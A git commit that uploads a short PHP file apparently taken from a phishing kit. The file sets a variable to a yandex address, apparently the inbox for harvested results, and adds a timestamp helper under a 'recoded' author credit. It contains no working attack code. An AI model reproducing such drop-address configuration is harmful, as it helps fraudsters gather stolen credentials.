c3dbe0999fa219853efec18601c4382c33d66a63
rhino350 <47240873+rhino350@users.noreply.github.com>
2019-02-01 00:51:12 -0800

    Add files via upload

---
+++ extra/mine.php
@@ -0,0 +1,15 @@
+﻿<?php
+
+//lkHos.RECODED with ♡ And lot Of ☕ (SPECIAL COPY FOR/ McQueen)
+	
+
+	// SHk455
+	$yours = "panther46@yandex.com";
+	
+
+	function now() {
+		date_default_timezone_set('GMT');
+		return date("d/m/Y H:i:s");
+	}
+
+?>
